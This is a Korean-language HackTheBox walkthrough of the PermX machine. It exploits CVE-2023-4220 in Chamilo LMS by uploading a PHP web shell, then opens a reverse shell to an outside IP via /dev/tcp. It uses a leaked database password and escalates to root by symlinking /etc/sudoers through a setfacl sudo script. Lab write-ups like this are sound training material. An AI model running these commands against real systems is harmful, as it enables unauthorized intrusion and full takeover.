# PermX - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA permx 10.10.11.23
```
<img width="1103" height="287" alt="image" src="https://github.com/user-attachments/assets/567e5734-191e-45b9-a25a-0f29a9a43eaf" />

- SSH(22)
- HTTP(80)

---
## HTTP
- `/etc/hosts`에 `permx.htb`등록.
<img width="1103" height="70" alt="image" src="https://github.com/user-attachments/assets/0c2c71f2-18a4-48c6-a6f6-8cbf682a0da7" />

### banner grabbing
```bash
whatweb http://permx.htb

curl -IL http://permx.htb
```
<img width="1103" height="333" alt="image" src="https://github.com/user-attachments/assets/d2032516-c86c-4df5-bef1-9501dbafda02" />

### VHOST
- `lms.permx.htb`발견.
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://permx.htb -H 'Host:FUZZ.permx.htb' -mc all -fs 270-300
```
<img width="1103" height="543" alt="image" src="https://github.com/user-attachments/assets/afa23bbd-c931-452e-b069-854840f34829" />

<br>
<br>

- `/etc/hosts` 등록.
<img width="1103" height="67" alt="image" src="https://github.com/user-attachments/assets/8a9e7e56-8ce4-4e97-a58e-8bee005c0d52" />

<br>
<br>

- `Chamilo LMS`
<img width="1100" height="611" alt="image" src="https://github.com/user-attachments/assets/cafa762c-9223-4be2-95c7-5c87e24668bd" />

### CVE-2023-4220
- `README.md`에서 버전 정보 노출.
<img width="430" height="83" alt="image" src="https://github.com/user-attachments/assets/0260f461-7096-4da9-b601-ef7c07d94e7f" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/CVE-2023-4220
- `big file upload`함수를 통해서 임의의 파일을 업로드 할 수 있는 취약점.
<img width="1100" height="460" alt="image" src="https://github.com/user-attachments/assets/1a6071b7-a754-4ae5-85d6-8df5514934e1" />

<br>
<br>

- https://starlabs.sg/advisories/23/23-4220/
- `/main/inc/lib/javascript/bigupload/files/`경로 존재 확인.
```bash
curl -L 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files'
```
<img width="1103" height="397" alt="image" src="https://github.com/user-attachments/assets/9e00bc20-c7b0-4bc8-b08f-1b4e25af76ff" />

<br>
<br>

- web shell 업로드.
```bash
cp /usr/share/webshells/php/simple-backdoor.php .

curl -F 'bigUploadFile=@simple-backdoor.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
```
<img width="1103" height="154" alt="image" src="https://github.com/user-attachments/assets/cf4b51df-161c-4afa-aae6-0e3a102de26c" />

<br>
<br>

- 명령어 실행 시도.
```bash
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/simple-backdoor.php?cmd=whoami'
```
<img width="1103" height="138" alt="image" src="https://github.com/user-attachments/assets/2aef17d8-3aa9-4c41-99e2-79bccc478faa" />

<br>
<br>

- 리버스 셸 연결 시도.
```bash
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/simple-backdoor.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.16.4%2F80%200%3E%261%22'
```
<img width="1103" height="69" alt="image" src="https://github.com/user-attachments/assets/45120a7f-db6f-4439-ac10-3ed9ccce2123" />

<br>
<br>

- 셸 획득.
<img width="1103" height="206" alt="image" src="https://github.com/user-attachments/assets/6c57e9f1-7290-4340-b576-a6d94cec8984" />

---
## Privesc
- `/var/www/chamilo/app/config/configuration.php`에서 DB계정 노출.
<img width="1103" height="174" alt="image" src="https://github.com/user-attachments/assets/db72385f-5488-4b16-a0d0-af29809dc494" />

<br>
<br>

- `/etc/passwd`에서 `mtz`유저 발견.
```bash
cat /etc/passwd | grep sh$
```
<img width="1103" height="59" alt="image" src="https://github.com/user-attachments/assets/ba5f7701-bbf6-4416-92d8-a1c17adfd650" />

<br>
<br>

- `mtz:03F6lY3uXAP2bkW8` 로그인.
```bash
su mtz
```
<img width="1103" height="82" alt="image" src="https://github.com/user-attachments/assets/6ba443bd-9f7a-4f6b-a5b0-4fae46e4675a" />

<br>
<br>

- `/opt/acl.sh`를 `root`권한으로 실행 가능.
```bash
sudo -l
```
<img width="1103" height="158" alt="image" src="https://github.com/user-attachments/assets/77728062-8372-40e6-a5d0-1c21e011499e" />

<br>
<br>

- `/opt/acl.sh`는 3개의 인자를 받아서 `root`권한으로 `setfacl`를 실행한다.
- `setfacl`는 파일의 권한을 바꾸는 프로그램.
- `target`은 `/home/mtz`로 시작해야한다.
<img width="1103" height="461" alt="image" src="https://github.com/user-attachments/assets/b7070063-a416-459a-adb5-bb2f53f0e7fe" />

<br>
<br>

- `/etc/sudoers`파일을 심볼릭 링크로 `/home/mtz`에 복사해와서 `mtz`유저에게 모든 권한 부여.
```bash
ln -sf /etc/sudoers

sudo /opt/acl.sh mtz rwx /home/mtz/sudoers

echo 'mtz ALL=(root) NOPASSWD: ALL' >> /home/mtz/sudoers

sudo -l
```
<img width="1103" height="234" alt="image" src="https://github.com/user-attachments/assets/b8ea44ca-cc80-48e4-9880-706ba4cb6620" />

<br>
<br>

- 셸 획득.
```bash
sudo /bin/bash
```
<img width="1103" height="61" alt="image" src="https://github.com/user-attachments/assets/ec55e17a-9dd3-4d70-842f-15f532aaa66c" />

---
## FLAG
- `/home/mtz/user.txt`
<img width="1103" height="251" alt="image" src="https://github.com/user-attachments/assets/83085085-68ca-4f23-b3b6-975e89e784f4" />

<br>
<br>

- `/root/root.txt`
<img width="1103" height="251" alt="image" src="https://github.com/user-attachments/assets/f07b8612-b483-45f0-8172-85f0fe93ae79" />



















